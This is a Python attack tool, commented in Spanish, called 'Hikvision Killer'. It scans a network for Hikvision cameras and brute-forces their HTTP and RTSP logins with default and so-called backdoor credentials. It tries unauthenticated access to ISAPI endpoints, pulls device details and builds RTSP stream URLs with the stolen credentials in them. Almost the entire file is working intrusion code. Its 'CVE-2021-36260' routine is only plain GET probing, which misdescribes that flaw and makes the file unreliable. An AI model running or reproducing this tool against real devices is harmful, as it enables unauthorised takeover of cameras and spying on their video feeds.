#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HIKVISION KILLER - Explotador de Cámaras Hikvision
==================================================
Herramienta para detección y explotación de cámaras Hikvision con vulnerabilidades conocidas.

Vulnerabilidades soportadas:
- CVE-2021-36260: Bypass de autenticación en firmware <V5.5.80
- Credenciales por defecto
- Backdoors conocidas
- Explotación RTSP

Autor: Harold Paredes / SourceSeal Red Team
Uso: python3 hikvision_killer.py [IP] [--scan] [--brute] [--exploit]
"""

import asyncio
import aiohttp
import re
import json
import base64
import hashlib
import time
from datetime import datetime
from typing import List, Dict, Optional, Tuple
import argparse
import sys

# ============================================================
# CONFIGURACIÓN
# ============================================================

class HikvisionConfig:
    # Credenciales por defecto Hikvision
    DEFAULT_CREDS = [
        ("admin", "12345"),
        ("admin", "admin"),
        ("admin", "123456"),
        ("admin", "password"),
        ("admin", ""),
        ("12345", "12345"),
        ("admin", "abc123"),
        ("admin", "1234"),
        ("admin", "111111"),
        ("admin", "666666"),
        ("admin", "888888"),
        ("admin", "000000"),
        ("admin", "12345678"),
        ("admin", "123456789"),
        ("admin", "qwerty"),
        ("admin", "letmein"),
        ("admin", "welcome"),
        ("admin", "monkey"),
        ("admin", "dragon"),
    ]
    
    # Credenciales backdoor conocidas
    BACKDOOR_CREDS = [
        ("admin", "Hik12345"),
        ("admin", "Hikvision@123"),
        ("admin", "hik12345"),
        ("admin", "12345hik"),
        ("admin", "Hikvision123"),
        ("admin", "HikVision123"),
        ("admin", "hikvision123"),
        ("admin", "123456hik"),
    ]
    
    # Puertos comunes Hikvision
    PORTS = [80, 443, 8000, 8001, 554, 1935, 8080]
    
    # Timeouts
    TIMEOUT = 3.0
    
    # User Agent
    USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Hikvision-Client/1.0"


# ============================================================
# DETECCIÓN DE DISPOSITIVOS HIKVISION
# ============================================================

async def is_hikvision_device(ip: str, port: int = 80) -> Tuple[bool, Optional[str]]:
    """Verifica si un dispositivo es Hikvision."""
    try:
        url = f"http://{ip}:{port}"
        headers = {"User-Agent": HikvisionConfig.USER_AGENT}
        
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers, timeout=HikvisionConfig.TIMEOUT) as resp:
                if resp.status == 200:
                    html = await resp.text()
                    
                    # Buscar firmas Hikvision
                    hikvision_signatures = [
                        r"Hikvision", r"hikvision", r"DS-2", r"iVMS",
                        r"isapi", r"webLang", r"Hikvision Web Server"
                    ]
                    
                    for signature in hikvision_signatures:
                        if re.search(signature, html, re.I):
                            return True, html[:200]
                    
                    # Verificar headers
                    server_header = resp.headers.get("Server", "")
                    if "Hikvision" in server_header or "hikvision" in server_header.lower():
                        return True, server_header
        
        return False, None
        
    except:
        return False, None


async def get_hikvision_model(ip: str, port: int = 80) -> Optional[str]:
    """Intenta obtener el modelo exacto de la cámara."""
    try:
        # Probar endpoint de información del sistema
        url = f"http://{ip}:{port}/ISAPI/System/deviceInfo"
        headers = {"User-Agent": HikvisionConfig.USER_AGENT}
        
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers, timeout=HikvisionConfig.TIMEOUT, 
                                   auth=aiohttp.BasicAuth("admin", "12345")) as resp:
                if resp.status == 200:
                    xml = await resp.text()
                    model_match = re.search(r'<modelNumber>([^<]+)</modelNumber>', xml)
                    if model_match:
                        return model_match.group(1)
        
        # Probar en la página principal
        url = f"http://{ip}:{port}/"
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers, timeout=HikvisionConfig.TIMEOUT) as resp:
                if resp.status == 200:
                    html = await resp.text()
                    model_match = re.search(r'DS-[\w-]+|DS[\d]+[A-Z]?', html, re.I)
                    if model_match:
                        return model_match.group(0)
        
        return None
        
    except:
        return None


# ============================================================
# EXPLOTACIÓN CVE-2021-36260
# ============================================================

async def exploit_cve_2021_36260(ip: str, port: int = 80) -> Dict:
    """
    Explotar CVE-2021-36260: Bypass de autenticación en Hikvision firmware <V5.5.80
    
    Esta vulnerabilidad permite acceder a endpoints sensibles sin autenticación.
    """
    result = {
        "vulnerable": False,
        "exploit_success": False,
        "endpoints": [],
        "error": None
    }
    
    try:
        # Endpoints vulnerables
        vulnerable_endpoints = [
            "/ISAPI/System/deviceInfo",
            "/ISAPI/System/Network/interfaces",
            "/ISAPI/System/Network/hosts",
            "/ISAPI/System/Network/dns",
            "/ISAPI/System/Network/ntp",
            "/ISAPI/System/Network/ippair",
            "/ISAPI/System/Log/clientLog",
            "/ISAPI/System/Users",
        ]
        
        base_url = f"http://{ip}:{port}"
        headers = {"User-Agent": HikvisionConfig.USER_AGENT}
        
        async with aiohttp.ClientSession() as session:
            for endpoint in vulnerable_endpoints:
                url = base_url + endpoint
                try:
                    async with session.get(url, headers=headers, timeout=HikvisionConfig.TIMEOUT) as resp:
                        if resp.status == 200:
                            data = await resp.text()
                            result["vulnerable"] = True
                            result["exploit_success"] = True
                            result["endpoints"].append({
                                "endpoint": endpoint,
                                "status": "accessible",
                                "data_length": len(data)
                            })
                        elif resp.status == 401:
                            result["endpoints"].append({
                                "endpoint": endpoint,
                                "status": "auth_required"
                            })
                        else:
                            result["endpoints"].append({
                                "endpoint": endpoint,
                                "status": f"error_{resp.status}"
                            })
                except:
                    result["endpoints"].append({
                        "endpoint": endpoint,
                        "status": "timeout"
                    })
        
        return result
        
    except Exception as e:
        result["error"] = str(e)
        return result


# ============================================================
# FUERZA BRUTA INTELIGENTE
# ============================================================

async def brute_force_rtsp(ip: str, port: int = 554) -> Dict:
    """Fuerza bruta en RTSP con credenciales de Hikvision."""
    result = {
        "success": False,
        "credentials": None,
        "tried": 0,
        "rtsp_url": None,
        "error": None
    }
    
    all_creds = HikvisionConfig.DEFAULT_CREDS + HikvisionConfig.BACKDOOR_CREDS
    
    for user, passwd in all_creds:
        result["tried"] += 1
        if await test_rtsp_credentials(ip, port, user, passwd):
            result["success"] = True
            result["credentials"] = f"{user}:{passwd}"
            result["rtsp_url"] = f"rtsp://{user}:{passwd}@{ip}:{port}"
            break
    
    return result


async def test_rtsp_credentials(ip: str, port: int, user: str, passwd: str) -> bool:
    """Prueba credenciales específicas en RTSP."""
    try:
        import socket
        
        creds = base64.b64encode(f"{user}:{passwd}".encode()).decode()
        
        # Crear socket y enviar OPTIONS
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(HikvisionConfig.TIMEOUT)
            s.connect((ip, port))
            
            req = (f"OPTIONS rtsp://{ip}:{port}/ RTSP/1.0\r\n"
                   f"CSeq: 1\r\n"
                   f"Authorization: Basic {creds}\r\n\r\n")
            s.sendall(req.encode())
            
            resp = s.recv(1024).decode(errors='ignore')
            
            return "200 OK" in resp or "RTSP/1.0" in resp
            
    except:
        return False


async def brute_force_http(ip: str, port: int = 80) -> Dict:
    """Fuerza bruta en HTTP con credenciales de Hikvision."""
    result = {
        "success": False,
        "credentials": None,
        "tried": 0,
        "session_cookie": None,
        "error": None
    }
    
    all_creds = HikvisionConfig.DEFAULT_CREDS + HikvisionConfig.BACKDOOR_CREDS
    base_url = f"http://{ip}:{port}"
    headers = {"User-Agent": HikvisionConfig.USER_AGENT}
    
    async with aiohttp.ClientSession() as session:
        for user, passwd in all_creds:
            result["tried"] += 1
            try:
                async with session.get(
                    base_url,
                    headers=headers,
                    timeout=HikvisionConfig.TIMEOUT,
                    auth=aiohttp.BasicAuth(user, passwd)
                ) as resp:
                    if resp.status == 200:
                        result["success"] = True
                        result["credentials"] = f"{user}:{passwd}"
                        
                        # Extraer cookie de sesión si existe
                        set_cookie = resp.headers.get("Set-Cookie", "")
                        if set_cookie:
                            result["session_cookie"] = set_cookie.split(";")[0]
                        break
            except:
                pass
    
    return result


# ============================================================
# EXTRACCIÓN DE INFORMACIÓN
# ============================================================

async def get_camera_info(ip: str, port: int = 80, user: str = "admin", passwd: str = "12345") -> Dict:
    """Obtiene información completa de la cámara."""
    info = {
        "model": None,
        "serial_number": None,
        "firmware_version": None,
        "hardware_version": None,
        "device_name": None,
        "mac_address": None,
        "ip_address": None,
        "error": None
    }
    
    try:
        base_url = f"http://{ip}:{port}"
        auth = aiohttp.BasicAuth(user, passwd)
        headers = {"User-Agent": HikvisionConfig.USER_AGENT}
        
        async with aiohttp.ClientSession() as session:
            # Obtener información del dispositivo
            async with session.get(
                f"{base_url}/ISAPI/System/deviceInfo",
                headers=headers,
                timeout=HikvisionConfig.TIMEOUT,
                auth=auth
            ) as resp:
                if resp.status == 200:
                    xml = await resp.text()
                    info["model"] = extract_xml_value(xml, "modelNumber")
                    info["serial_number"] = extract_xml_value(xml, "serialNumber")
                    info["firmware_version"] = extract_xml_value(xml, "firmwareVersion")
                    info["hardware_version"] = extract_xml_value(xml, "hardwareVersion")
                    info["device_name"] = extract_xml_value(xml, "deviceName")
                    info["mac_address"] = extract_xml_value(xml, "macAddress")
                    info["ip_address"] = extract_xml_value(xml, "ipAddress")
        
        return info
        
    except Exception as e:
        info["error"] = str(e)
        return info


def extract_xml_value(xml: str, tag: str) -> Optional[str]:
    """Extrae un valor de una etiqueta XML."""
    match = re.search(f'<{tag}>([^<]+)</{tag}>', xml)
    return match.group(1) if match else None


# ============================================================
# EXTRACCIÓN DE STREAMS RTSP
# ============================================================

async def get_rtsp_streams(ip: str, port: int = 554, user: str = "admin", passwd: str = "12345") -> Dict:
    """Obtiene URLs de streams RTSP de la cámara."""
    streams = {
        "main_stream": None,
        "sub_stream": None,
        "streams": [],
        "error": None
    }
    
    try:
        # Intentar obtener streams desde ISAPI
        base_url = f"http://{ip}:{port if port != 554 else 80}"
        auth = aiohttp.BasicAuth(user, passwd)
        headers = {"User-Agent": HikvisionConfig.USER_AGENT}
        
        async with aiohttp.ClientSession() as session:
            # Obtener información de canales
            async with session.get(
                f"{base_url}/ISAPI/Streaming/channels",
                headers=headers,
                timeout=HikvisionConfig.TIMEOUT,
                auth=auth
            ) as resp:
                if resp.status == 200:
                    xml = await resp.text()
                    
                    # Extraer canales
                    channel_matches = re.findall(r'<id>(\d+)</id>', xml)
                    for channel_id in channel_matches:
                        # Obtener URL RTSP
                        rtsp_url = f"rtsp://{user}:{passwd}@{ip}:{554}/Streaming/Channels/{channel_id}01"
                        streams["streams"].append(rtsp_url)
                    
                    if len(streams["streams"]) > 0:
                        streams["main_stream"] = streams["streams"][0]
                        if len(streams["streams"]) > 1:
                            streams["sub_stream"] = streams["streams"][1]
        
        # Si no se obtuvieron streams, generar URLs estándar
        if not streams["streams"]:
            streams["main_stream"] = f"rtsp://{user}:{passwd}@{ip}:{554}/Streaming/Channels/101"
            streams["sub_stream"] = f"rtsp://{user}:{passwd}@{ip}:{554}/Streaming/Channels/102"
            streams["streams"] = [streams["main_stream"], streams["sub_stream"]]
        
        return streams
        
    except Exception as e:
        streams["error"] = str(e)
        return streams


# ============================================================
# PRINCIPAL
# ============================================================

async def scan_and_attack(ip: str) -> Dict:
    """Escaneo y ataque completo a un dispositivo."""
    result = {
        "ip": ip,
        "is_hikvision": False,
        "model": None,
        "vulnerabilities": {},
        "exploit_results": {},
        "timestamp": datetime.now().isoformat()
    }
    
    # Verificar si es Hikvision
    is_hik, banner = await is_hikvision_device(ip)
    result["is_hikvision"] = is_hik
    
    if not is_hik:
        return result
    
    # Obtener modelo
    result["model"] = await get_hikvision_model(ip)
    
    # Probar CVE-2021-36260
    result["vulnerabilities"]["CVE-2021-36260"] = await exploit_cve_2021_36260(ip)
    
    # Fuerza bruta RTSP
    result["exploit_results"]["rtsp_brute"] = await brute_force_rtsp(ip)
    
    # Fuerza bruta HTTP
    result["exploit_results"]["http_brute"] = await brute_force_http(ip)
    
    # Si se encontraron credenciales, obtener información
    if result["exploit_results"]["rtsp_brute"]["success"]:
        creds = result["exploit_results"]["rtsp_brute"]["credentials"].split(":")
        user, passwd = creds[0], creds[1]
        result["camera_info"] = await get_camera_info(ip, 80, user, passwd)
        result["rtsp_streams"] = await get_rtsp_streams(ip, 554, user, passwd)
    
    return result


async def main():
    """Función principal."""
    parser = argparse.ArgumentParser(
        description="Hikvision Killer - Explotador de cámaras Hikvision"
    )
    parser.add_argument("ip", nargs="?", help="IP de la cámara Hikvision")
    parser.add_argument("--scan", action="store_true", help="Escaneo de red para encontrar cámaras Hikvision")
    parser.add_argument("--brute", action="store_true", help="Fuerza bruta en la IP especificada")
    parser.add_argument("--exploit", action="store_true", help="Explotar CVE-2021-36260")
    parser.add_argument("--network", type=str, default="192.168.1.0/24", help="Red a escanear")
    
    args = parser.parse_args()
    
    if args.scan:
        # Escanear red en busca de cámaras Hikvision
        print("🔍 Escaneando red en busca de cámaras Hikvision...")
        
        import ipaddress
        net = ipaddress.ip_network(args.network, strict=False)
        all_ips = [str(ip) for ip in net.hosts()]
        
        hikvision_cameras = []
        for ip in all_ips:
            is_hik, banner = await is_hikvision_device(ip)
            if is_hik:
                model = await get_hikvision_model(ip)
                hikvision_cameras.append({
                    "ip": ip,
                    "model": model,
                    "banner": banner
                })
                print(f"  ✅ Encontrada cámara Hikvision en {ip} - Modelo: {model}")
        
        print(f"\n📊 Encontradas {len(hikvision_cameras)} cámaras Hikvision")
        
        if hikvision_cameras:
            print("\nCámaras detectadas:")
            for i, cam in enumerate(hikvision_cameras, 1):
                print(f"  [{i}] {cam['ip']} - {cam['model']}")
        
    elif args.ip:
        # Ataque a IP específica
        print(f"🎯 Atacando cámara en {args.ip}...")
        result = await scan_and_attack(args.ip)
        
        print("\n" + "="*70)
        print("  📊 RESULTADOS DEL ATAQUE")
        print("="*70)
        
        print(f"\nIP: {result['ip']}")
        print(f"¿Es Hikvision?: {'✅ Sí' if result['is_hikvision'] else '❌ No'}")
        print(f"Modelo: {result['model']}")
        
        if result['is_hikvision']:
            # Mostrar vulnerabilidades
            print("\n🔴 Vulnerabilidades:")
            for cve, info in result['vulnerabilities'].items():
                status = "✅ VULNERABLE" if info.get('vulnerable') else "❌ No vulnerable"
                print(f"  {cve}: {status}")
                if info.get('exploit_success'):
                    print(f"    📌 Endpoints accesibles: {len(info.get('endpoints', []))}")
            
            # Mostrar resultados de explotación
            print("\n🎯 Resultados de explotación:")
            for method, info in result['exploit_results'].items():
                status = "✅ ÉXITO" if info.get('success') else "❌ FALLÓ"
                print(f"  {method}: {status}")
                if info.get('credentials'):
                    print(f"    🔑 Credenciales: {info['credentials']}")
                if info.get('rtsp_url'):
                    print(f"    🎥 RTSP URL: {info['rtsp_url']}")
            
            # Mostrar información de la cámara
            if 'camera_info' in result:
                print("\n📋 Información de la cámara:")
                for key, value in result['camera_info'].items():
                    if value and key != 'error':
                        print(f"    {key}: {value}")
            
            # Mostrar streams
            if 'rtsp_streams' in result:
                print("\n🎥 Streams RTSP:")
                if result['rtsp_streams']['main_stream']:
                    print(f"    Main: {result['rtsp_streams']['main_stream']}")
                if result['rtsp_streams']['sub_stream']:
                    print(f"    Sub: {result['rtsp_streams']['sub_stream']}")
        
        # Guardar resultados
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"hikvision_exploit_{args.ip}_{timestamp}.json"
        with open(filename, 'w') as f:
            json.dump(result, f, indent=2, ensure_ascii=False)
        print(f"\n✅ Resultados guardados en: {filename}")
    else:
        parser.print_help()


if __name__ == "__main__":
    asyncio.run(main())
